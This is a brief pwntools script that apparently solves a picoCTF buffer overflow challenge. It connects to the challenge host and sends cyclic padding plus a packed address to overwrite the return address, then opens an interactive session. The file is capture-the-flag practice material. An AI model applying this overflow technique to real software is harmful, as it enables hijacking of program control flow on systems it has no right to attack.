from pwn import *

# io = process('./vuln')
io = remote('saturn.picoctf.net', 61773)

io.sendlineafter(b'Give me a string that gets you the flag', cyclic(14) + p32(0x8049da0))

io.interactive()